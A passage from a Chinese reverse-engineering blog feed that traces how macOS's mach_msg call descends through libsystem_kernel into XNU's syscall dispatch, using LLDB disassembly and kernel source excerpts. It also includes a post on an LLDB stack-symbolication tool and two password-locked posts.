MACH_PORT_NULL);        if (kr != KERN_SUCCESS) {                printf(&quot;[-] Send message failed: 0x%d\n&quot;, kr);                return -1 ;        }        return 0;}</code></pre><p>里面的macho函数<code>mach_msg()</code>到底后面执行到哪里？于是展开一段追踪</p><p>从ida的导入表中可以看到这个函数实现在libSystem.B.dylib 顺便说下，这个动态库实际上只是一层封装，里面导入了/usr/lib/system下面的动态库。</p><pre><code class="assembly">* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 2.1    frame #0: 0x00007fff79299694 libsystem_kernel.dylib`mach_msglibsystem_kernel.dylib`mach_msg:-&gt;  0x7fff79299694 &lt;+0&gt;: pushq  %rbp    0x7fff79299695 &lt;+1&gt;: movq   %rsp, %rbp    0x7fff79299698 &lt;+4&gt;: pushq  %r15    0x7fff7929969a &lt;+6&gt;: pushq  %r14Target 0: (CVE-2019-6231-poc) stopped.</code></pre><p>调试可以看出mach_msg实现在libsystem_kernel.dylib之中</p><pre><code class="assembly">(lldb) dislibsystem_kernel.dylib`mach_msg:-&gt;  0x7fff79299694 &lt;+0&gt;:   pushq  %rbp    0x7fff79299695 &lt;+1&gt;:   movq   %rsp, %rbp    0x7fff79299698 &lt;+4&gt;:   pushq  %r15    0x7fff7929969a &lt;+6&gt;:   pushq  %r14    0x7fff7929969c &lt;+8&gt;:   pushq  %r13    0x7fff7929969e &lt;+10&gt;:  pushq  %r12    0x7fff792996a0 &lt;+12&gt;:  pushq  %rbx    0x7fff792996a1 &lt;+13&gt;:  subq   $0x28, %rsp    0x7fff792996a5 &lt;+17&gt;:  movl   %ecx, %r13d    0x7fff792996a8 &lt;+20&gt;:  movl   %esi, %ebx    0x7fff792996aa &lt;+22&gt;:  movq   %rdi, %r14    0x7fff792996ad &lt;+25&gt;:  movl   0x10(%rbp), %eax    0x7fff792996b0 &lt;+28&gt;:  movl   %ebx, %r12d    0x7fff792996b3 &lt;+31&gt;:  andl   $0xfffffbbf, %r12d        ; imm = 0xFFFFFBBF     0x7fff792996ba &lt;+38&gt;:  movl   %eax, (%rsp)    0x7fff792996bd &lt;+41&gt;:  movl   %r12d, %esi    0x7fff792996c0 &lt;+44&gt;:  movl   %edx, %r15d    0x7fff792996c3 &lt;+47&gt;:  movl   %r8d, -0x2c(%rbp)    0x7fff792996c7 &lt;+51&gt;:  movl   %r9d, -0x30(%rbp)    0x7fff792996cb &lt;+55&gt;:  callq  0x7fff79299170            ; mach_msg_trap    ...</code></pre><pre><code class="c">mach_msg_return_t __cdecl mach_msg(mach_msg_header_t *msg, mach_msg_option_t option, mach_msg_size_t send_size, mach_msg_size_t rcv_size, mach_port_name_t rcv_name, mach_msg_timeout_t timeout, mach_port_name_t notify){  mach_msg_return_t result; // eax  mach_msg_option_t v8; // er12  result = mach_msg_trap();  if ( !result )    return 0;  if ( !(option &amp; 0x40) &amp;&amp; result == 268435463 )  {    do      result = mach_msg_trap();    while ( result == 268435463 );  }  v8 = option;  if ( !_bittest(&amp;v8, 0xAu) &amp;&amp; result == 268451845 )  {    do      result = mach_msg_trap();    while ( result == 268451845 );  }  return result;}</code></pre><p>通过调式和ida反汇编mach_msg函数可以看出，最终会调用mach_msg_trap这个函数，再跟一下</p><pre><code class="assembly">* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 3.1    frame #0: 0x00007fff79299170 libsystem_kernel.dylib`mach_msg_traplibsystem_kernel.dylib`mach_msg_trap:-&gt;  0x7fff79299170 &lt;+0&gt;:  movq   %rcx, %r10    0x7fff79299173 &lt;+3&gt;:  movl   $0x100001f, %eax          ; imm = 0x100001F     0x7fff79299178 &lt;+8&gt;:  syscall     0x7fff7929917a &lt;+10&gt;: retq   Target 0: (CVE-2019-6231-poc) stopped.</code></pre><p>这个函数后面会调用0x100001f系统调用，可以小结得到系统库封装了最底层的实现，最终通过系统调用进入内核。在用户层到这里已经就到头了，无法再跟进。</p><h4 id="XNU内核系统调用流程"><a href="#XNU内核系统调用流程" class="headerlink" title="XNU内核系统调用流程"></a>XNU内核系统调用流程</h4><p>系统调用发生在内核之中，那么最开始处理系统调用的地方又在哪？通过<a href="http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html" target="_blank" rel="external">intel官方文档</a>可以找到</p><pre><code>SYSCALL invokes an OS system-call handler at privilege level 0.It does so by loading RIP from the IA32_LSTAR MSR</code></pre><p>也就是内核需要将系统调用处理函数入口放到<code>IA32_LSTAR</code> <a href="https://en.wikipedia.org/wiki/Model-specific_register" target="_blank" rel="external">model specific register</a>. 在内核源码中对应在<code>osfmk/i386/mp_desc.c</code>的<code>cpu_syscall_init(cpu_data_t *cdp)</code>函数之中</p><pre><code class="c">/* * Set MSRs for sysenter/sysexit and syscall/sysret for 64-bit. */voidcpu_syscall_init(cpu_data_t *cdp){#if MONOTONIC    mt_cpu_up(cdp);#else /* MONOTONIC */#pragma unused(cdp)#endif /* !MONOTONIC */    wrmsr64(MSR_IA32_SYSENTER_CS, SYSENTER_CS);     wrmsr64(MSR_IA32_SYSENTER_EIP, DBLMAP((uintptr_t) hi64_sysenter));    wrmsr64(MSR_IA32_SYSENTER_ESP, current_cpu_datap()-&gt;cpu_desc_index.cdi_sstku);    /* Enable syscall/sysret */    wrmsr64(MSR_IA32_EFER, rdmsr64(MSR_IA32_EFER) | MSR_IA32_EFER_SCE);    /*     * MSRs for 64-bit syscall/sysret     * Note USER_CS because sysret uses this + 16 when returning to     * 64-bit code.     */    wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall));    wrmsr64(MSR_IA32_STAR, (((uint64_t)USER_CS) &lt;&lt; 48) | (((uint64_t)KERNEL64_CS) &lt;&lt; 32));    /*     * Emulate eflags cleared by sysenter but note that     * we also clear the trace trap to avoid the complications     * of single-stepping into a syscall. The nested task bit     * is also cleared to avoid a spurious &quot;task switch&quot;     * should we choose to return via an IRET.     */    wrmsr64(MSR_IA32_FMASK, EFL_DF|EFL_IF|EFL_TF|EFL_NT);}</code></pre><p><code>wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall));</code>也就是系统调用会由<code>hi64_syscall</code>函数处理。这个函数实现在<code>xnu/osfmk/x86_64/idt64.s</code>之中</p><pre><code class="assembly">Entry(hi64_syscall)Entry(idt64_syscall)    swapgs     /* Use RAX as a temporary by shifting its contents into R11[32:63]      * The systemcall number is defined to be a 32-bit quantity, as is      * RFLAGS.      */    shlq    $32, %rax    or     %rax, %r11.globl EXT(dblsyscall_patch_point)EXT(dblsyscall_patch_point)://    movabsq    $0x12345678ABCDEFFFULL, %rax     /* Generate offset to the double-mapped per-CPU data shadow      * into RAX      */    leaq    EXT(idt64_hndl_table0)(%rip), %rax    mov    16(%rax), %rax    mov     %rsp, %gs:CPU_UBER_TMP(%rax)  /* save user stack */    mov     %gs:CPU_ESTACK(%rax), %rsp  /* switch stack to per-cpu estack */    sub    $(ISF64_SIZE), %rsp    /*     * Synthesize an ISF frame on the exception stack     */    movl    $(USER_DS), ISF64_SS(%rsp)    mov    %rcx, ISF64_RIP(%rsp)        /* rip */    mov    %gs:CPU_UBER_TMP(%rax), %rcx    mov    %rcx, ISF64_RSP(%rsp)        /* user stack --changed */    mov    %r11, %rax    shrq    $32, %rax        /* Restore RAX */    mov    %r11d, %r11d        /* Clear r11[32:63] */    mov    %r11, ISF64_RFLAGS(%rsp)    /* rflags */    movl    $(SYSCALL_CS), ISF64_CS(%rsp)    /* cs - a pseudo-segment */    mov    %rax, ISF64_ERR(%rsp)        /* err/rax - syscall code */    movq    $(HNDL_SYSCALL), ISF64_TRAPFN(%rsp)    movq    $(T_SYSCALL), ISF64_TRAPNO(%rsp)    /* trapno */    swapgs    jmp    L_dispatch            /* this can only be 64-bit */</code></pre><p>继续跟下去，会得到如下执行流程</p><pre><code>syscall--&gt;hi64_syscall-&gt;L_dispatch--&gt;ks_dispatch--&gt;ks_dispatch_user--&gt;L_dispatch_U64--&gt;L_dispatch_64bit--&gt;L_common_dispatch--&gt;hndl_syscall</code></pre><pre><code class="assembly">/* * 64bit Tasks * System call entries via syscall only: * *    r15     x86_saved_state64_t *    rsp     kernel stack * *    both rsp and r15 are 16-byte aligned *    interrupts disabled *    direction flag cleared */Entry(hndl_syscall)    TIME_TRAP_UENTRY    movq    %gs:CPU_ACTIVE_THREAD,%rcx    /* get current thread     */    movl    $-1, TH_IOTIER_OVERRIDE(%rcx)    /* Reset IO tier override to -1 before handling syscall */    movq    TH_TASK(%rcx),%rbx        /* point to current task  */    /* Check for active vtimers in the current task */    TASK_VTIMER_CHECK(%rbx,%rcx)    /*     * We can be here either for a mach, unix machdep or diag syscall,     * as indicated by the syscall class:     */    movl    R64_RAX(%r15), %eax        /* syscall number/class */    movl    %eax, %edx    andl    $(SYSCALL_CLASS_MASK), %edx    /* syscall class */    cmpl    $(SYSCALL_CLASS_MACH&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_mach_scall64)    cmpl    $(SYSCALL_CLASS_UNIX&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_unix_scall64)    cmpl    $(SYSCALL_CLASS_MDEP&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_mdep_scall64)    cmpl    $(SYSCALL_CLASS_DIAG&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_diag_scall64)    /* Syscall class unknown */    sti    CCALL3(i386_exception, $(EXC_SYSCALL), %rax, $1)    /* no return */</code></pre><p><code>hndl_syscall</code>这个函数会系统调用分为<code>hndl_unix_scall64</code> 、<code>hndl_mach_scall64</code>、<code>hndl_mdep_scall64</code>、<code>hndl_diag_scall64</code>四类分别处理</p><p>这里以<code>hndl_unix_scall64</code>为列</p><pre><code class="assembly">Entry(hndl_unix_scall)        TIME_TRAP_UENTRY    movq    %gs:CPU_ACTIVE_THREAD,%rcx    /* get current thread     */    movq    TH_TASK(%rcx),%rbx        /* point to current task  */    incl    TH_SYSCALLS_UNIX(%rcx)        /* increment call count   */    /* Check for active vtimers in the current task */    TASK_VTIMER_CHECK(%rbx,%rcx)    sti    CCALL1(unix_syscall, %r15)    /*     * always returns through thread_exception_return     */</code></pre><p>这里调动了<code>unix_syscall</code>函数，这个函数在bsd/dev/i386/systemcalls.c之中实现，里面进行了一些权限检查</p><p>以及根据系统调用表去调用对应的实现</p><pre><code class="c">  thread = current_thread();  uthread = get_bsdthread_info(thread);  // regs is derrived from r15 ...  code = regs-&gt;rax &amp; SYSCALL_NUMBER_MASK;  callp = (code &gt;= NUM_SYSENT) ? &amp;sysent[63] : &amp;sysent[code];  // ...  vt = (void *)uthread-&gt;uu_arg;  // ...  memcpy(vt, args_start_at_rdi ? &amp;regs-&gt;rdi : &amp;regs-&gt;rsi,        args_in_regs * sizeof(syscall_arg_t));  // ...  error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0]));</code></pre><p>目前执行的流程如下</p><pre><code>hi64_syscallL_dispatch_U64L_dispatch_64bitL_common_dispatchhndl_syscall // rdx, pushed in hi64_syscallhndl_unix_scall64unix_syscall64error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0])); // now we&#39;re there</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://www.binss.me/blog/interrupt-and-exception/" target="_blank" rel="external">https://www.binss.me/blog/interrupt-and-exception/</a></p><p><a href="https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html" target="_blank" rel="external">https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html</a></p><p><a href="https://gist.github.com/yrp604/23e86dce9ca12bf514ef" target="_blank" rel="external">https://gist.github.com/yrp604/23e86dce9ca12bf514ef</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;XNU系统调用深度解析&quot;&gt;&lt;a href=&quot;#XNU系统调用深度解析&quot; class=&quot;headerlink&quot; title=&quot;XNU系统调用深度解析&quot;&gt;&lt;/a&gt;XNU系统调用深度解析&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;从一个函数分析到系统调用的内核实现&lt;/p&gt;
      
    
    </summary>
    
      <category term="iOSRE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/iOSRE/"/>
    
    
      <category term="XNU" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/XNU/"/>
    
      <category term="Kernel" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Kernel/"/>
    
  </entry>
  
  <entry>
    <title>LLDB调试器栈符号化</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/10/03/xia0LLDB/xia0LLDB/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/10/03/xia0LLDB/xia0LLDB/</id>
    <published>2018-10-03T05:27:59.000Z</published>
    <updated>2019-02-21T10:07:17.274Z</updated>
    
    <content type="html"><![CDATA[<h3 id="强化你的lldb调试器"><a href="#强化你的lldb调试器" class="headerlink" title="强化你的lldb调试器"></a>强化你的lldb调试器</h3><h3 id="Why"><a href="#Why" class="headerlink" title="Why?"></a>Why?</h3><p>lldb作为苹果iOS和macOS的调试器在正向开发中十分强大，不过对于逆向人员来说却不是很友好。尤其是那些符号表被strip以后的执行文件。去定位追溯一个函数的执行流程时，查看当前的栈帧只有一堆内存地址，如果要定位是哪个函数通常的流程就是找到当前模块的内存偏移，然后栈上的地址逐一减去改偏移然后去ida中查找改地址，最后才能定位到函数名。流程琐碎且都是重复工作，花费大量时间去定位符号信息。因此我想做一个能自动恢复栈帧符号的命令。只要输入改命令就能显示函数的调用情况。</p><h3 id="How"><a href="#How" class="headerlink" title="How?"></a>How?</h3><p>但是符号表都已经被strip了怎么才能恢复符号呢？我的想法就是macho可执行文件中其实是有很大一部分段储存的OC函数信息，里面肯定是有类名和方法名的，我们要做的就是通过栈中的地址，遍历所有的类以及方法，找到最佳的类方法即可。判断原则就是找到距离栈地址最近且小于等于栈地址的类方法。然后记录类名和方法名即可。</p><p>正好lldb提供了python的接口，可以开发自定义的命令。</p><h3 id="And-what"><a href="#And-what" class="headerlink" title="And what ?"></a>And what ?</h3><p>虽然有python接口，但是lldb里面集成了一个OC的解释器，其语法要求特别严格，按照通常开发的写法会有很多错误，经过不断的调试和修复bug，一个开发版基于lldb python栈符号恢复命令开发完成。git地址在<a href="https://github.com/4ch12dy/xia0LLDB">这里</a></p><p>这里面还有的搜索算法以及异常处理还需要优化，以及对于block这类函数还不能恢复，不过对于大多数的场景目前还是可用。具体效果可以如下：</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/b_bt.jpg?raw=true" alt="https://github.com/4ch12dy/xia0LLDB/blob/master/resource/b_bt.jpg?raw=true"></p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/b_sbt.jpg?raw=true" alt="https://github.com/4ch12dy/xia0LLDB/blob/master/resource/b_sbt.jpg?raw=true"></p><h3 id="update"><a href="#update" class="headerlink" title="update"></a>update</h3><p>现已支持恢复block结构符号解析，通过提供的ida脚本，得到一个json格式的block符号文件，然后在lldb命令行中输入<code>sbt -f block-json-file-path</code>即可加载该文件。效果如下：</p><h4 id="原始的bt命令结果"><a href="#原始的bt命令结果" class="headerlink" title="原始的bt命令结果"></a>原始的bt命令结果</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/orig_bt.png?raw=true" alt="orig_bt"></p><h4 id="sbt命令（没有加载block符号文件）"><a href="#sbt命令（没有加载block符号文件）" class="headerlink" title="sbt命令（没有加载block符号文件）"></a>sbt命令（没有加载block符号文件）</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/sbt-noblockfile.png?raw=true" alt="sbt-noblockfile"></p><h4 id="sbt命令（带有block符号文件）"><a href="#sbt命令（带有block符号文件）" class="headerlink" title="sbt命令（带有block符号文件）"></a>sbt命令（带有block符号文件）</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/sbt-blockfile.png?raw=true" alt="sbt-blockfile"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;强化你的lldb调试器&quot;&gt;&lt;a href=&quot;#强化你的lldb调试器&quot; class=&quot;headerlink&quot; title=&quot;强化你的lldb调试器&quot;&gt;&lt;/a&gt;强化你的lldb调试器&lt;/h3&gt;&lt;h3 id=&quot;Why&quot;&gt;&lt;a href=&quot;#Why&quot; class=&quot;he
      
    
    </summary>
    
      <category term="iOSRE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/iOSRE/"/>
    
    
      <category term="python" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/python/"/>
    
      <category term="LLDB" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/LLDB/"/>
    
  </entry>
  
  <entry>
    <title>unicorn</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/09/13/unicorn/unicorn/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/09/13/unicorn/unicorn/</id>
    <published>2018-09-13T06:39:03.000Z</published>
    <updated>2019-04-16T03:03:09.532Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!">    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="unicorn" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/unicorn/"/>
    
  </entry>
  
  <entry>
    <title>reversing-dot-kr</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/29/reversing-dot-kr/reversing-dot-kr/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/29/reversing-dot-kr/reversing-dot-kr/</id>
    <published>2018-04-29T03:47:09.000Z</published>
    <updated>2019-04-29T11:47:36.495Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!">    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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